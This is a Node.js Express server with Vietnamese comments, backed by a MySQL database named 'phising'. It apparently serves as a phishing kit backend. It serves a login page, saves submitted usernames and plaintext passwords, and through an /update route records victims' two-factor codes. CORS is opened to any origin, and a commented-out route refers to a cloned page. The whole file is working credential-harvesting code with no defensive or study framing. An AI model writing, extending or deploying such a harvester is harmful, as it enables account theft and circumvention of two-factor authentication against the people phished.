const express = require('express');
const mysql = require('mysql');
const bodyParser = require('body-parser');
const path = require('path'); // Import thư viện path
const session = require('express-session');
var cors = require('cors');



const app = express();
const port = 3000;
app.use(session({
    secret: 'your-secret-key', // Key bảo mật cho phiên
    resave: false,
    saveUninitialized: true
}));
// Tạo kết nối đến cơ sở dữ liệu MySQL
const db = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: '',
    database: 'phising',
});

// Kết nối đến cơ sở dữ liệu
db.connect((err) => {
    if (err) {
        console.error('Lỗi kết nối đến cơ sở dữ liệu: ' + err.stack);
        return;
    }
    console.log('Kết nối thành công đến cơ sở dữ liệu.');
});

// Sử dụng body-parser để xử lý dữ liệu POST
app.use(bodyParser.urlencoded({ extended: true }));
app.use(function (req, res, next) {

    // Website you wish to allow to connect
    res.setHeader('Access-Control-Allow-Origin', '*');

    // Request methods you wish to allow
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');

    // Request headers you wish to allow
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

    // Set to true if you need the website to include cookies in the requests sent
    // to the API (e.g. in case you use sessions)
    res.setHeader('Access-Control-Allow-Credentials', true);

    // Pass to next layer of middleware
    next();
});
// Route cho trang đăng nhập

app.get('/login', (req, res) => {

    res.sendFile(path.join(__dirname, 'register.html')); // Gửi tệp HTML
});
// app.get('/link', (req, res) => {

//     res.sendFile(path.join(__dirname, './clone/next.html')); // Gửi tệp HTML
// });
// Xử lý yêu cầu POST khi người dùng đăng nhập
app.get('/update', (req, res) => {
    //console.log('Trang cá nhân của ' + req.session.user.rkey)
    const { twofa, rkey } = req.query;

    //console.log("dây là data", rkey, twofa)
    // Truy vấn SQL để cập nhật thông tin người dùng theo username
    const updateQuery = 'UPDATE users SET twofa = ? WHERE rkey = ?';

    // Thực hiện truy vấn SQL
    db.query(updateQuery, [twofa, rkey], (err, results) => {
        if (err) {
            return res.status(500).send('Lỗi truy vấn cơ sở dữ liệu');
        }

        if (results.affectedRows === 1) {
            // Cập nhật thành công
            res.send('Cập nhật thành công');
        } else {
            // Không tìm thấy username hoặc không có bản ghi nào được cập nhật
            res.send('Không tìm thấy tên đăng nhập hoặc không có bản ghi nào được cập nhật');
        }
    });
});

// Xử lý yêu cầu POST khi người dùng đăng ký
app.post('/add', (req, res) => {
    const { username, password, rkey } = req.body;
    console.log(username)
    req.session.user = { rkey: rkey };

    // Kiểm tra xem tài khoản đã tồn tại trong cơ sở dữ liệu chưa
    const checkUserExists = 'SELECT * FROM users WHERE username = ?';
    db.query(checkUserExists, [username], (err, results) => {
        if (err) {
            return res.status(500).send('Lỗi truy vấn cơ sở dữ liệu');
        }

        // Nếu tài khoản không tồn tại, chèn thông tin người dùng mới vào cơ sở dữ liệu
        const insertUser = 'INSERT INTO users (username, pass, rkey) VALUES (?, ?,?)';
        db.query(insertUser, [username, password, rkey], (err, results) => {
            if (err) {
                return res.status(500).send('Lỗi khi chèn dữ liệu vào cơ sở dữ liệu');
            }

            res.send('done');
        });
    });
});

// ...

app.listen(port, () => {
    console.log(`App đang lắng nghe tại http://localhost:${port}`);
});
